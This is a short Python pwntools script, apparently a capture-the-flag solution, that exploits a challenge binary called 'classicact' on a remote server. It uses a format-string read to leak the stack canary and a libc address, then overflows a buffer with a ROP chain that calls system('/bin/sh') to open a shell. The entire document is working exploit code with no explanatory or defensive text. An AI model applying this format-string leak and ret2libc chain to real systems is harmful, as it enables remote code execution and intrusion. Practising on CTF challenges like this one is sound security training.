from pwn import * 

p = remote('0.cloud.chals.io', 10058)
# p = process('./classicact')
e = ELF('./classicact')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadget = [0xe6c7e, 0xe6c81, 0xe6c84]
pop_rdi = 0x4013a3

p.sendline(b'%19$p.%25$p')
p.recvuntil(b'Hello:\n')
addr = p.recvline()[:-1].split(b'.')
canary = int(addr[0], 16)
libc.address = int(addr[1], 16) - (libc.symbols['__libc_start_main'] + 243)
print(hex(canary))
print(hex(libc.address))

payload = b'A' * 0x48
payload += p64(canary)*2
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
p.sendline(payload)

p.interactive()
